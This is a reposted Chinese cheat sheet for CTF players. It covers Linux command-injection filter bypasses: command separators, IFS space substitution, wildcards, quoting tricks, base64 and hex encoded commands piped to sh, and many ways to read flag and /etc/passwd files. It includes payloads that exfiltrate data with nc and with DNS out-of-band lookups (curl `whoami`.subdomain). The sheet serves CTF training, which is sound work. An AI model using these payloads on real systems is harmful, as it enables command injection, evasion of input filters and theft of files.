# CTF 比赛中 Linux 命令行绕过方式总结

## 管道符

### “;”分号用法

方式：command1 ; command2

用;号隔开每个命令, 每个命令按照从左到右的顺序,顺序执行， 彼此之间不关心是否失败， 所有命令都会执行。

### “| ”管道符用法

上一条命令的输出，作为下一条命令参数。ctf里面：ping 127.0.0.1 | ls(只执行ls不执行前面的）

方式：command1 | command

Linux所提供的管道符“|”将两个命令隔开，管道符左边命令的输出就会作为管道符右边命令的输入。连续使用管道意味着第一个命令的输出会作为 第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推。

利用一个管道：

\# rpm -qa|grep licq

这条命令使用一个管道符“|”建立了一个管道。管道将rpm -qa命令的输出（包括系统中所有安装的RPM包）作为grep命令的输入，从而列出带有licq字符的RPM包来。

利用多个管道：

\# cat /etc/passwd | grep /bin/bash | wc -l

这条命令使用了两个管道，利用第一个管道将cat命令（显示passwd文件的内容）的输出送给grep命令，grep命令找出含有“/bin /bash”的所有行；第二个管道将grep的输出送给wc命令，wc命令统计出输入中的行数。这个命令的功能在于找出系统中有多少个用户使用bash。

### “&”符号用法

**ctf中用法 ping 127.0.0.1 & ls(先执行ls后执行ping)**

&放在启动参数后面表示设置此进程为后台进程

方式：command1 &

默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个'&'实现这个目的。

### “&&”符号用法

**ctf中用法 ping 127.0.0.1 && ls（ping命令正确才执行ls 要是ping 1 && ls ls就不会执行)**

shell 在执行某个命令的时候，会返回一个返回值，该返回值保存在 shell 变量 $? 中。当 $? == 0 时，表示执行成功；当 $? == 1 时（我认为是非0的数，返回值在0-255间），表示执行失败。

有时候，下一条命令依赖前一条命令是否执行成功。如：在成功地执行一条命令之后再执行另一条命令，或者在一条命令执行失败后再执行另一条命令等。shell 提供了 && 和 || 来实现命令执行控制的功能，shell 将根据 && 或 || 前面命令的返回值来控制其后面命令的执行。

**语法格式如下：**

command1 && command2 [&& command3 ...]

命令之间使用 && 连接，实现逻辑与的功能。

只有在 && 左边的命令返回真（命令返回值 $? == 0），&& 右边的命令才会被执行。

只要有一个命令返回假（命令返回值 $? == 1），后面的命令就不会被执行。

### “||”符号用法

**和&&相反 左边为假才执行命令二**

逻辑或的功能

**语法格式如下：**

command1 || command2 [|| command3 ...]命令之间使用 || 连接，实现逻辑或的功能。

只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才会被执行。这和 c 语言中的逻辑或语法功能相同，即实现短路逻辑或操作。

只要有一个命令返回真（命令返回值 $? == 0），后面的命令就不会被执行。–直到返回真的地方停止执行。

举例，ping命令判断存活主机

```bash
ping -c 1 -w 1 192.168.1.1 &> /dev/null && result=0 ||result=1    if [ "$result" == 0 ];then echo "192.168.1.1 is UP!" else echo "192.168.2.1 is DOWN!" fi
```

注意 &>要连起来写。

## 一些绕过方式

### linux下绕过空格

```bash
{cat,flag.txt}
cat${IFS}flag.txt
cat$IFS$9flag.txt
cat<flag.txt
cat<>flag.txt
ca\t fl\ag
```

`kg=$'\x20flag.txt'&&cat$kg`(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)

**windows下绕过空格**

（实用性不是很广，也就type这个命令可以用）

```bash
type.\flag.txt
type,flag.txt
echo,123456
```

### 通配符绕过

？？？在linux里面可以进行代替字母

`/???/c?t flag.txt`

*在linux里面可以进行模糊匹配

`cat flag.* *`进行模糊匹配php

### nc外带数据

本地监听端口

`nc -lvp 9999`

命令执行出 `ping 127.0.0.0 & nc ip port > key.php`

### 内联执行的做法：

payload：cat$IFS$1`ls`

使用内联执行会将 ```内的输出作为前面命令的输入，当我们输入上述payload时，等同于`cat falg.php;cat index.php`

### 利用DNS管道解析：

这里提供一个在线网址，可以直接进行给一个利用网址：admin.dnslog.link注册一个账号后会分配一个子域名可以利用。

```bash
|curl `whoami`.[http://xxxx.xxx](http://xxxx.xxx/)(子域名)
```

这样就会在利用网址看到反弹结果。\`whoami\`因为`反引号在linux下是执行命令的特殊符号，原理请见：http://mp.weixin.qq.com/s/jwqWnP0FHhMoR5b6iCS6NQ

### 网络地址转化为数字地址

网络地址有另外一种表示形式，就是数字地址比如127.0.0.1可以转化为2130706433

可以直接访问

**[http://2130706433](http://127.0.0.1/)**

或者 **[http://0x7F000001](http://127.0.0.1/)**

这样就可以绕过.的ip过滤，这里给个转化网址：

```http
http://www.msxindl.com/tools/ip/ip_num.asp
```

### 通过查看文件的权限 chmod +777赋予权限

```bash
l's' -la
c'h'm'o'd +777 /filename
```

### 代替cat的命令

```ini
cat:由第一行开始显示内容，并将所有内容输出

tac:从最后一行倒序显示内容，并将所有内容输出

more:根据窗口大小，一页一页的现实文件内容

less:和more类似，但其优点可以往前翻页，而且进行可以搜索字符

head:只显示头几行

tail:只显示最后几行

nl:类似于cat -n，显示时输出行号

tailf:类似于tail -f

sort:读文件

dir:来查看当前目录文件
```

## Linux花式读取文件内容

ps:目标是获取flag.txt的内容

### static-sh读取文件：

```bash
static-sh ./flag.txt
```

\#输出结果：

```ini
./flag.txt: line 1: flag{this_is_a_test}: not found
```

### paste读取文件:

```bash
paste ./flag.txt /etc/passwd
```

\#输出结果：

```ini
flag{this_is_a_test}

root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin

sync:x:4:65534:sync:/bin:/bin/sync
```

### diff读取文件 :

```bash
diff ./flag.txt /etc/passwd
```

\#输出结果：

```ini
1c1,45< flag{this_is_a_test}\ No newline at end of file---> root:x:0:0:root:/root:/bin/bash> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin> bin:x:2:2:bin:/bin:/usr/sbin/nologin> sys:x:3:3:sys:/dev:/usr/sbin/nologin> sync:x:4:65534:sync:/bin:/bin/sync
```

### od读取文件

```bash
od -a ./flag.txt
```

\#输出结果：

```ini
0000000 f l a g { t h i s _ i s _ a _ t0000020 e s t }0000024
```

### bzmore读取文件:

```bash
bzmore ./flag.txt
```

### bzless读取文件：

```bash
bzless ./flag.txtecho `bzless ./flag.txt`
```

\#输出结果：

```ini
------> ./flag.txt <------ flag{this_is_a_test} 
```

### curl读取文件：

```bash
curl file:///home/coffee/flag
```

**nc 传输文件**

靶机：

```bash
nc 10.10.10.10 4444 < /var/www/html/key.php
```

接受机：

```bash
nc -l 4444 > key.txt
```

### wget操作进行目标读取

```bash
wget url -P path
```

## 一些命令分隔符

### 常见分隔符

linux中：%0a 、%0d 、; 、& 、| 、&&、||

windows中：%0a、&、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）

### 过滤了 bash可以用sh

```bash
echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
```

### 拼接命令cat flag.php：

```bash
;a=fl;b=ag.php;cat $a$b
```

*其中有这么一条过滤方法，我们用上述方法无法绕过，但是我们只要改变一下顺序就可以：*

```bash
;a=ag.php;b=fl;cat $b$a
```

绕过空格就用上面提到的$IFS$1完整的payload 

```bash
;a=ag.php;b=fl;cat$IFS$1$b$aelse if(preg_match("/.*f.*l.*a.*g.*/", $ip)){die("fxck your flag!");}
```

## 编码绕过

### base64：

```bash
echo YWJjZGU=|base64 -d #打印出来abcde

echo Y2F0IGZhbGcucGhw|base64 -d|bash #cat flag.php

echo Y2F0IGZhbGcucGhw|base64 -d|sh #cat flag.php
```

### hex编码绕过：

```bash
echo 63617420666c61672e706870 | xxd -r -p|bash #cat flag.php
```

### unicode编码

```bash
$(printf “\154\163”) #ls

$(printf “\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70”)#cat flag.php
```

*对于关键字还可以用单引号和反斜杠绕过 比如* 

```bash
cat fl’'ag cat fl\ag
```

*总结一下，payload：*

```bash
;a=ag.php;b=fl;cat$IFS$1$b$a和 cat$IFS$1`ls`
```

*得到的flag查看源码。*

转载： https://zhuanlan.zhihu.com/p/339266206
